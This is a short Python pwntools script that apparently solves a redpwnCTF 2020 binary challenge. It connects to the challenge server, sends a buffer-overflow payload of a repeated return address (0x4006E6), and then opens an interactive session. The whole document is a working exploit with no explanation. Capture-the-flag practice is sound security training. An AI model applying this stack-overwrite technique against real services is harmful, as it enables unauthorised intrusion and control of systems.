from pwn import *

p = remote('2020.redpwnc.tf', 31908)

p.recvrepeat(1)


p.sendline(p64(0x4006E6)*0x20)


p.interactive()
